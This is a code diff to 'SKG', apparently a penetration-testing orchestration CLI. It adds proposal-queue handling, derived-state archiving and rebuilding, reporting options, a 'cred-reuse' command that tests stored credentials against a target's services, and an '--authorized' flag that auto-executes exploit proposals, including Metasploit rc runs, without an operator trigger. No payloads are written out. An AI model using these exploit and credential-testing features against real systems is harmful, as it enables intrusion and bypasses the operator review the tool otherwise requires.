+            print(f"  Exit:     {pr.get('returncode')}")
+        if pr.get("log_file"):
+            print(f"  Log:      {pr.get('log_file')}")
+        if pr.get("events_file"):
+            print(f"  Events:   {pr.get('events_file')}")
+        if pr.get("events_emitted") is not None:
+            print(f"  Emitted:  {pr.get('events_emitted')}")
+        summary = pr.get("msf_summary") or {}
+        if summary.get("findings"):
+            print("  Findings:")
+            for item in summary.get("findings", [])[:8]:
+                print(f"    - {item}")
+        if summary.get("errors"):
+            print("  Notes:")
+            for item in summary.get("errors", [])[:5]:
+                print(f"    - {item}")
+        if pr.get("ingest_error"):
+            print(f"  Ingest:   {pr.get('ingest_error')}")
         return
 
     if subcmd == "trigger":
+        if str(REPO_ROOT) not in sys.path:
+            sys.path.insert(0, str(REPO_ROOT))
+        from skg.forge.proposals import trigger_action
         items = _load(None)
         pr = next((p for p in items if p.get("id","").startswith(a.proposal_id)), None)
         if not pr:
             print(f"  Not found: {a.proposal_id}")
             return
+        if pr.get("proposal_kind") != "field_action":
+            print(f"  Proposal {pr.get('id')} is not a field_action proposal")
+            return
+        pr = trigger_action(pr["id"])
         action = pr.get("action", {})
         rc     = action.get("rc_file","")
         module = action.get("module","")
@@ -1713,37 +3583,44 @@ def cmd_proposals(a):
         return
 
     if subcmd == "accept":
-        items = _load(None)
-        pr = next((p for p in items if p.get("id","").startswith(a.proposal_id)), None)
-        if pr:
-            pr["status"] = "accepted"
-            (PDIR / f"{pr['id']}.json").write_text(json.dumps(pr, indent=2))
-            print(f"  Accepted: {pr['id']}")
-        else:
-            print(f"  Not found: {a.proposal_id}")
+        if str(REPO_ROOT) not in sys.path:
+            sys.path.insert(0, str(REPO_ROOT))
+        from skg.forge import proposals as _proposals
+        try:
+            result = _proposals.accept(a.proposal_id)
+            print(f"  Accepted: {a.proposal_id}")
+            if result.get("installed_path"):
+                print(f"  Installed: {result['installed_path']}")
+            if result.get("preserved_existing"):
+                print("  Preserved existing: staged draft was weaker than the active toolchain")
+        except Exception as exc:
+            print(f"  Failed: {exc}")
         return
 
     if subcmd == "reject":
-        items = _load(None)
-        pr = next((p for p in items if p.get("id","").startswith(a.proposal_id)), None)
-        if pr:
-            pr["status"] = "rejected"
-            pr["reject_reason"] = getattr(a, "reason", "")
-            (PDIR / f"{pr['id']}.json").write_text(json.dumps(pr, indent=2))
-            print(f"  Rejected: {pr['id']}")
-        else:
-            print(f"  Not found: {a.proposal_id}")
+        if str(REPO_ROOT) not in sys.path:
+            sys.path.insert(0, str(REPO_ROOT))
+        from skg.forge import proposals as _proposals
+        try:
+            result = _proposals.reject(a.proposal_id, reason=getattr(a, "reason", ""))
+            print(f"  Rejected: {a.proposal_id}")
+            if result.get("cooldown_until"):
+                print(f"  Cooldown until: {result['cooldown_until']}")
+        except Exception as exc:
+            print(f"  Failed: {exc}")
         return
 
     if subcmd == "defer":
-        items = _load(None)
-        pr = next((p for p in items if p.get("id","").startswith(a.proposal_id)), None)
-        if pr:
-            pr["status"] = "deferred"
-            (PDIR / f"{pr['id']}.json").write_text(json.dumps(pr, indent=2))
-            print(f"  Deferred: {pr['id']}")
-        else:
-            print(f"  Not found: {a.proposal_id}")
+        if str(REPO_ROOT) not in sys.path:
+            sys.path.insert(0, str(REPO_ROOT))
+        from skg.forge import proposals as _proposals
+        try:
+            result = _proposals.defer(a.proposal_id, days=getattr(a, "days", 7))
+            print(f"  Deferred: {a.proposal_id}")
+            if result.get("until"):
+                print(f"  Until: {result['until']}")
+        except Exception as exc:
+            print(f"  Failed: {exc}")
         return
 
     print("  Usage: skg proposals [list|show|trigger|accept|reject|defer]")
@@ -1790,6 +3667,152 @@ def cmd_collect(a):
         print(f"  {'OK' if ok else 'FAILED'}  run={run_id}")
 
 
+def _derived_runtime_paths() -> dict[str, Path]:
+    return {
+        "interp": SKG_STATE_DIR / "interp",
+        "folds": SKG_STATE_DIR / "discovery" / "folds",
+    }
+
+
+def _archive_root(timestamp: str | None = None) -> Path:
+    stamp = timestamp or datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
+    return SKG_STATE_DIR / "archive" / f"derived_{stamp}"
+
+
+def cmd_derived(a):
+    if a.derived_cmd == "archive":
+        return _cmd_derived_archive(a)
+    if a.derived_cmd == "rebuild":
+        return _cmd_derived_rebuild(a)
+    print("  Unknown derived command")
+
+
+def _cmd_derived_archive(a):
+    archive_root = _archive_root()
+    archive_root.mkdir(parents=True, exist_ok=True)
+    manifest = {
+        "archived_at": _iso_now(),
+        "archive_root": str(archive_root),
+        "paths": {},
+    }
+
+    for name, path in _derived_runtime_paths().items():
+        count = 0
+        if path.exists():
+            try:
+                count = sum(1 for _ in path.iterdir())
+            except Exception:
+                count = 0
+        if not path.exists() or count == 0:
+            path.mkdir(parents=True, exist_ok=True)
+            manifest["paths"][name] = {
+                "source": str(path),
+                "archived_to": None,
+                "entries": 0,
+            }
+            continue
+
+        dest = archive_root / name
+        shutil.move(str(path), str(dest))
+        path.mkdir(parents=True, exist_ok=True)
+        manifest["paths"][name] = {
+            "source": str(path),
+            "archived_to": str(dest),
+            "entries": count,
+        }
+
+    (archive_root / "manifest.json").write_text(json.dumps(manifest, indent=2))
+
+    print("  Derived State Archived:")
+    print(f"    root   : {archive_root}")
+    for name, info in manifest["paths"].items():
+        archived_to = info.get("archived_to") or "(nothing to archive)"
+        print(f"    {name:6s}: {info['entries']} entries -> {archived_to}")
+
+
+def _rebuild_interp_from_events() -> tuple[int, list[str]]:
+    sys.path.insert(0, str(SKG_HOME))
+    from skg.sensors.projector import project_events_dir
+
+    outputs = []
+    seen = set()
+    for source_dir in (SKG_STATE_DIR / "events", DISCOVERY_DIR):
+        if not source_dir.exists():
+            continue
+        for out in project_events_dir(source_dir, SKG_STATE_DIR / "interp"):
+            out_str = str(out)
+            if out_str in seen:
+                continue
+            seen.add(out_str)
+            outputs.append(out_str)
+    return len(outputs), outputs
+
+
+def _rebuild_fold_state() -> tuple[int, list[str]]:
+    surface_path = _latest_surface()
+    if not surface_path:
+        return 0, []
+
+    sys.path.insert(0, str(SKG_HOME))
+    from skg.kernel.folds import FoldDetector, FoldManager
+
+    try:
+        surface = json.loads(Path(surface_path).read_text())
+    except Exception:
+        return 0, []
+
+    fold_state_dir = SKG_STATE_DIR / "discovery" / "folds"
+    fold_state_dir.mkdir(parents=True, exist_ok=True)
+
+    refreshed_by_ip = {}
+    for fold in FoldDetector().detect_all(
+        events_dir=DISCOVERY_DIR,
+        cve_dir=CVE_DIR,
+        toolchain_dir=SKG_HOME,
+    ):
+        for target in surface.get("targets", []):
+            tip = target.get("ip", "")
+            if tip and (tip in fold.location or fold.location.endswith(tip)):
+                refreshed_by_ip.setdefault(tip, FoldManager()).add(fold)
+                break
+
+    written = []
+    for ip, fm in refreshed_by_ip.items():
+        out = fold_state_dir / f"folds_{ip.replace('.', '_')}.json"
+        fm.persist(out)
+        written.append(str(out))
+
+    return len(written), written
+
+
+def _cmd_derived_rebuild(a):
+    interp_dir = SKG_STATE_DIR / "interp"
+    folds_dir = SKG_STATE_DIR / "discovery" / "folds"
+    interp_dir.mkdir(parents=True, exist_ok=True)
+    folds_dir.mkdir(parents=True, exist_ok=True)
+
+    interp_count = sum(1 for _ in interp_dir.iterdir()) if interp_dir.exists() else 0
+    folds_count = sum(1 for _ in folds_dir.iterdir()) if folds_dir.exists() else 0
+    if (interp_count or folds_count) and not getattr(a, "append", False):
+        print("  Refusing rebuild into non-empty derived directories.")
+        print("  Archive first with: skg derived archive")
+        print("  Or explicitly append with: skg derived rebuild --append")
+        return
+
+    rebuilt_interp_count, interp_outputs = _rebuild_interp_from_events()
+    rebuilt_fold_count, fold_outputs = _rebuild_fold_state()
+
+    print("  Derived State Rebuilt:")
+    print(f"    interp : {rebuilt_interp_count} outputs")
+    if interp_outputs[:5]:
+        for out in interp_outputs[:5]:
+            print(f"      {out}")
+    print(f"    folds  : {rebuilt_fold_count} files")
+    if fold_outputs[:5]:
+        for out in fold_outputs[:5]:
+            print(f"      {out}")
+
+
 def main():
     p = argparse.ArgumentParser(prog="skg",
             description="SKG — Spherical Knowledge Graph")
@@ -1798,7 +3821,9 @@ def main():
     # ── Field
     sub.add_parser("start", help="start the gravity field")
     sub.add_parser("stop", help="stop the gravity field")
-    sub.add_parser("status", help="entropy landscape + field state")
+    sp = sub.add_parser("status", help="entropy landscape + field state")
+    sp.add_argument("--self-audit", action="store_true",
+                    help="audit SKG substrate health: memory, folds, proposals, recall, feedback, local model")
     sub.add_parser("surface", help="full attack surface map")
 
     wp = sub.add_parser("web", help="gravity web — bonds + coupling")
@@ -1839,7 +3864,7 @@ def main():
     pp = sub.add_parser("proposals", help="operator proposal queue")
     pps = pp.add_subparsers(dest="proposal_cmd", required=True)
     ppl = pps.add_parser("list", help="list proposals")
-    ppl.add_argument("--status", default="pending")
+    ppl.add_argument("--status", default="all")
     pps.add_parser("show", help="show proposal").add_argument("proposal_id")
     pt_trig = pps.add_parser("trigger", help="trigger field_action proposal")
     pt_trig.add_argument("proposal_id")
@@ -1885,6 +3910,22 @@ def main():
     # ── Gravity
     gp = sub.add_parser("gravity", help="run the gravity field loop")
     gp.add_argument("--cycles", type=int, default=5)
+    gp.add_argument("--target", default=None)
+    gp.add_argument("--authorized", action="store_true",
+                    help="Authorized engagement: auto-execute exploit proposals without operator trigger")
+
+    dd = sub.add_parser("derived", help="archive or rebuild derived operator state")
+    dds = dd.add_subparsers(dest="derived_cmd", required=True)
+    dds.add_parser("archive", help="archive derived interp/fold state and recreate empty directories")
+    ddr = dds.add_parser("rebuild", help="rebuild derived interp/fold state from append-only substrate")
+    ddr.add_argument("--append", action="store_true", help="append rebuild output into existing derived directories")
+
+    rp2 = sub.add_parser("report", help="substrate report from canonical state")
+    rp2.add_argument("--target", default=None, help="scope report to one target in surface")
+    rp2.add_argument("--at", default=None, help="show target state as of an ISO timestamp from pearls")
+    rp2.add_argument("--diff-against", dest="diff_against", default=None, help="diff current target state against an ISO timestamp from pearls")
+    rp2.add_argument("--json", dest="json_out", action="store_true", help="emit raw JSON report")
+    rp2.add_argument("--llm", action="store_true", help="ask TinyLlama for a short narrative summary")
 
     # ── Mode
     mp = sub.add_parser("mode", help="set operational mode")
@@ -1895,7 +3936,7 @@ def main():
     # ── Confidence calibration
     cal_p = sub.add_parser("calibrate",
         help="learn per-sensor confidence weights from engagement history")
-    cal_p.add_argument("--db", default="/var/lib/skg/engagement.db",
+    cal_p.add_argument("--db", default=str(SKG_STATE_DIR / "engagement.db"),
                         help="engagement database (build with: skg engage build)")
     cal_p.add_argument("--report", action="store_true",
                         help="print calibration report without saving")
@@ -1906,13 +3947,13 @@ def main():
     ens = enp.add_subparsers(dest="engage_cmd", required=False)
 
     en_build = ens.add_parser("build", help="build SQLite DB from all telemetry")
-    en_build.add_argument("--out", default="/var/lib/skg/engagement.db")
+    en_build.add_argument("--out", default=str(SKG_STATE_DIR / "engagement.db"))
 
     en_analyze = ens.add_parser("analyze", help="analyze dataset integrity (DP-* checks)")
-    en_analyze.add_argument("--db", default="/var/lib/skg/engagement.db")
+    en_analyze.add_argument("--db", default=str(SKG_STATE_DIR / "engagement.db"))
 
     en_report = ens.add_parser("report", help="full engagement report")
-    en_report.add_argument("--db",  default="/var/lib/skg/engagement.db")
+    en_report.add_argument("--db",  default=str(SKG_STATE_DIR / "engagement.db"))
     en_report.add_argument("--out", default=None, help="write JSON report to file")
 
     # ── System audit (filesystem / process / log integrity)
@@ -1921,7 +3962,7 @@ def main():
 
     aus_scan = aus.add_parser("scan", help="audit a host via SSH")
     aus_scan.add_argument("--target",      required=True)
-    aus_scan.add_argument("--user",        default="root")
+    aus_scan.add_argument("--user",        default=None)
     aus_scan.add_argument("--key",         default=None)
     aus_scan.add_argument("--password",    default=None)
     aus_scan.add_argument("--workload-id", dest="workload_id", default=None)
@@ -1960,6 +4001,11 @@ def main():
     xps.add_parser("list-paths", help="list all mapped exploit paths")
     xps.add_parser("binary-catalog", help="print binary analysis catalog JSON")
 
+    xcr = xps.add_parser("cred-reuse", help="test stored credentials against a target's services")
+    xcr.add_argument("--target", required=True, help="target IP or hostname")
+    xcr.add_argument("--authorized", action="store_true",
+                     help="Test credentials directly (authorized engagement; default: generate proposals)")
+
     # ── Folds
     flp = sub.add_parser("folds", help="structural knowledge gaps that add to field energy")
     fls = flp.add_subparsers(dest="folds_cmd", required=False)
@@ -1980,6 +4026,7 @@ def main():
     rps = rp.add_subparsers(dest="resonance_cmd", required=True)
     rps.add_parser("status")
     rps.add_parser("ingest")
+    rps.add_parser("ollama")
     rq = rps.add_parser("query")
     rq.add_argument("text")
     rq.add_argument("--type", default="all",
@@ -2015,6 +4062,7 @@ def main():
     catc.add_argument("--min-cvss", type=float, default=6.0)
     catc.add_argument("--max-wickets", type=int, default=20)
     catc.add_argument("--out", default=None)
+    catc.add_argument("--dry-run", action="store_true")
 
     # ── Toolchains (preserved)
     ap = sub.add_parser("aprs")
@@ -2106,6 +4154,8 @@ def main():
         "web":       cmd_web_view,
         "target":    cmd_target,
         "observe":   cmd_observe,
+        "derived":   cmd_derived,
+        "report":    cmd_report,
         "gravity":   cmd_gravity,
         "proposals": cmd_proposals,
         "mode":      cmd_mode,
